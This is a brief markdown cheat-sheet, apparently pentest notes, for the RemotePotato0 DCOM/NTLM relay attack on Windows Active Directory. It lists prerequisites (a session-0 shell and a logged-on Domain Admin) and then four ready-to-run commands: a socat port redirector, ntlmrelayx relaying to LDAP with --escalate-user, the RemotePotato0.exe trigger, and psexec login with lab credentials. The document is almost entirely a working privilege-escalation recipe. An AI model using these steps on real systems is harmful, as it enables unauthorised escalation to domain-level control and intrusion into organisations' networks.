# RemotePotato0 DCOM DCE RPC relay

### It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine

## Requirements

#### 1) a shell in session 0 (e.g. WinRm shell or SSH shell)

#### 2) a privileged user is logged on in the session 1 (e.g. a Domain Admin user)

## Github repo: https://github.com/antonioCoco/RemotePotato0/

## Steps

 - sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 (Terminal)

 - sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user (Terminal)

 - RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2 (Session 0)

 - psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135' (Terminal)
